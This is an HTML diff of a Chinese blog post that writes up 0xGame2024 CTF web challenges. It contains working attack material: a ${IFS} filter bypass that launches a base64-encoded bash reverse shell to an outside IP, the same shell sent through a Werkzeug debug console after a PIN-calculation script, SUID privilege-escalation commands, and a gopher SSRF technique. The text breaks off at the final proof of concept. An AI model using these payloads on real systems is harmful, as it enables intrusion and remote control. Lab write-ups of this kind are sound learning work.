@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="写在前面打这个比赛还是学到不少姿势，以后还是得多参加新生赛。 知识点： Linux命令提权辅助查询网站：https:&#x2F;&#x2F;gtfobins.github.io&#x2F;  gopher协议简介：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6993 gopher服务器类似于web服务器，可使用形如”gopher:&#x2F;&#x2F;gopher.example.com”的url来与服务器上的gophe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0xGame2024web复现">
+<meta property="og:url" content="http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="K1ato&#39;s blog">
+<meta property="og:description" content="写在前面打这个比赛还是学到不少姿势，以后还是得多参加新生赛。 知识点： Linux命令提权辅助查询网站：https:&#x2F;&#x2F;gtfobins.github.io&#x2F;  gopher协议简介：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6993 gopher服务器类似于web服务器，可使用形如”gopher:&#x2F;&#x2F;gopher.example.com”的url来与服务器上的gophe">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/1.PNG">
+<meta property="article:published_time" content="2024-10-21T02:53:26.000Z">
+<meta property="article:modified_time" content="2024-11-03T12:16:29.371Z">
+<meta property="article:author" content="k1ato">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/1.PNG">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>0xGame2024web复现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/04/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E5%AD%A6%E4%B9%A0%E4%B9%8BRMI%E7%AF%87/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/10/20/%E6%8F%90%E6%9D%83%E9%82%A3%E4%BA%9B%E4%BA%8B/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&text=0xGame2024web复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&title=0xGame2024web复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&is_video=false&description=0xGame2024web复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0xGame2024web复现&body=Check out this article: http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&title=0xGame2024web复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&title=0xGame2024web复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&title=0xGame2024web复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&title=0xGame2024web复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&name=0xGame2024web复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&t=0xGame2024web复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-shell"><span class="toc-number">3.</span> <span class="toc-text">hello_shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-pe"><span class="toc-number">4.</span> <span class="toc-text">hello_pe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-ssrf"><span class="toc-number">5.</span> <span class="toc-text">hello_ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-pickle"><span class="toc-number">6.</span> <span class="toc-text">baby_pickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WhySoSerial"><span class="toc-number">7.</span> <span class="toc-text">WhySoSerial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#paste-bin"><span class="toc-number">8.</span> <span class="toc-text">paste_bin</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        0xGame2024web复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">k1ato</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-21T02:53:26.000Z" class="dt-published" itemprop="datePublished">2024-10-21</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>打这个比赛还是学到不少姿势，以后还是得多参加新生赛。</p>
+<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><ul>
+<li><p>Linux命令提权辅助查询网站：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+</li>
+<li><p>gopher协议简介：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6993">https://xz.aliyun.com/t/6993</a></p>
+<p>gopher服务器类似于web服务器，可使用形如”gopher:&#x2F;&#x2F;gopher.example.com”的url来与服务器上的gopher服务器通信，客户端将显示该服务器的根目录，用户可以通过选择目录项进行导航。Gopher 服务器的根目录是用户连接后首先看到的内容。它提供了指向其他子目录和文件的链接。</p>
+</li>
+<li><p>pickle反序列化除了正常的对类实例进行反序列化外，还有一种更高级的姿势是用opcode。</p>
+</li>
+</ul>
+<h3 id="hello-shell"><a href="#hello-shell" class="headerlink" title="hello_shell"></a>hello_shell</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>] ?? <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$cmd</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$cmd</span>, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;no space allowed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>); <span class="comment">// 没有回显怎么办？ </span></span><br></pre></td></tr></table></figure>
+
+<p>过滤了空格且无回显，靶机可出网，WP给的payload是：</p>
+<p><code>bash$&#123;IFS&#125;-c$&#123;IFS&#125;&#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzU2NzggMD4mMQ==|base64,-d|bash,-i&#125;&#39;</code></p>
+<p>${IFS}换成空格后是<code>bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzU2NzggMD4mMQ==|base64,-d|bash,-i&#125;&#39;</code></p>
+<p>其中base64值是<code>bash -i &gt;&amp; /dev/tcp/1.2.3.4/5678 0&gt;&amp;1</code></p>
+<p>分析一下这段命令：</p>
+<p><code>bash -c &quot;xxx&quot;</code>代表把字符串当作命令执行</p>
+<p>而字符串<code>&#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzU2NzggMD4mMQ==|base64,-d|bash,-i&#125;&#39;</code>用大括号包起来，用逗号分割每一条命令，每一条命令依次执行，管道符表示前一条命令的输出是后一条命令的输入，但我在本地执行这条命令报错，就没用大括号这种形式。</p>
+<p>PAYLOAD:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash$&#123;IFS&#125;-c$&#123;IFS&#125;&#x27;echo$&#123;IFS&#125;YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMTEzLjIxNy8yMzMzIDA+JjE=|base64$&#123;IFS&#125;-d|bash$&#123;IFS&#125;-i&#x27;</span><br><span class="line"></span><br><span class="line">$&#123;IFS&#125;换成空格：</span><br><span class="line">bash -c &#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMTEzLjIxNy8yMzMzIDA+JjE=|base64 -d|bash -i&#x27;</span><br><span class="line"></span><br><span class="line">base64值是bash -i &gt;&amp; /dev/tcp/82.156.113.217/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>连上shell后需要提权，才能读flag文件，这⾥是suid提权，以下命令可以发现系统上运行的所有suid可执行文件。具体来说，命令将尝试查找具有root权限的suid的文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">2 find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">3 find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<p>所谓suid就是，你本来是www-data的权限，但是当你执⾏有suid权限的（可执行）⽂件时，你会暂时拥有这⽂件所有者的权限（比如root）</p>
+<p>看到有一个<code>/var/www/html/wc</code>的命令拥有suid权限，在gtfobins找到wc，查看SUID部分，照葫芦画瓢，在终端中执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LFILE=/flag</span><br><span class="line">./wc --files0-from &quot;$LFILE&quot;</span><br></pre></td></tr></table></figure>
+
+<p>多试几次能成功。</p>
+<h3 id="hello-pe"><a href="#hello-pe" class="headerlink" title="hello_pe"></a>hello_pe</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">index</span>():</span><br><span class="line">    <span class="keyword">print</span>(request.user_agent.<span class="keyword">string</span>.<span class="title function_ invoke__">lower</span>().<span class="title function_ invoke__">find</span>(<span class="string">&quot;mozi&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">open</span>(__file__).<span class="title function_ invoke__">read</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/fileread&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">read_file</span>():</span><br><span class="line">    filename = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">open</span>(filename).<span class="title function_ invoke__">read</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(debug=True, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>算pin码脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.9/site-packages/flask/app.py&#x27;</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485723381762&#x27;</span>, <span class="comment"># /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;70d3d850-a8d2-4ff1-a285-34c4a401e57d&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id 或 /proc/sys/kernel/random/boot_id（二选一）再拼接/proc/self/cgroup</span></span><br><span class="line">]   </span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+
+<p>用户名是<code>app</code>，进入控制台后，输入如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os </span><br><span class="line">os.popen(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMTEzLjIxNy8yMzMzIDA+JjE=|base64 -d|bash&#x27;).read()</span><br><span class="line">//其中base64值为bash -i &gt;&amp; /dev/tcp/82.156.113.217/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>吃到shell后，先执行<code>find / -type f -perm -u=s 2&gt;/dev/null</code>寻找suid权限的二进制文件，返回结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1 /usr/bin/umount</span><br><span class="line">2 /usr/bin/chsh</span><br><span class="line">3 /usr/bin/newgrp</span><br><span class="line">4 /usr/bin/gpasswd</span><br><span class="line">5 /usr/bin/mount</span><br><span class="line">6 /usr/bin/su</span><br><span class="line">7 /usr/bin/passwd</span><br><span class="line">8 /usr/bin/chfn</span><br><span class="line">9 /usr/bin/find</span><br></pre></td></tr></table></figure>
+
+<p>用<code>find</code>提权，在gtfobins上查找提权命令</p>
+<img src="/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/1.PNG" class="">
+
+
+
+<h3 id="hello-ssrf"><a href="#hello-ssrf" class="headerlink" title="hello_ssrf"></a>hello_ssrf</h3><p>考察ssrf使⽤gopher协议去发post包（做法就是在burp中把post包送到Decoder中url编码两次，第⼀次编码是给web服务器解码，第⼆次编码是给gopher协议解码）</p>
+<p>Gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP、Telnet、Redis、Memcache，也可以进行GET、POST请求。这无疑极大拓宽了SSRF的攻击面。</p>
+<p>源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunparse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">BlackList=[</span><br><span class="line">    <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/cmd&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>():</span><br><span class="line">    <span class="keyword">if</span> request.remote_addr != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> os.popen(request.form.get(<span class="string">&quot;cmd&quot;</span>)).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/visit&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No url provided&quot;</span></span><br><span class="line">    url = urlparse(url)</span><br><span class="line">    realIpAddress = socket.gethostbyname(url.hostname)</span><br><span class="line">    <span class="keyword">if</span> url.scheme == <span class="string">&quot;file&quot;</span> <span class="keyword">or</span> realIpAddress <span class="keyword">in</span> BlackList:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker!&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;-L&quot;</span>, urlunparse(url)], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># print(result.stderr)</span></span><br><span class="line">    <span class="keyword">return</span> result.stdout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>解法：</p>
+<p>以下这个post包要编码成符合gopher协议格式的，让靶机的curl去请求，这样request.remote_addr就是127.0.0.1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /cmd HTTP/1.1</span><br><span class="line">Host: 47.76.151.192:60087</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">cmd=env</span><br></pre></td></tr></table></figure>
+
+<p>直接在burp的Decoder中url编码两次，在加上gopher协议前缀，请求&#x2F;visit路由即可。</p>
+<p>最终poc：</p>
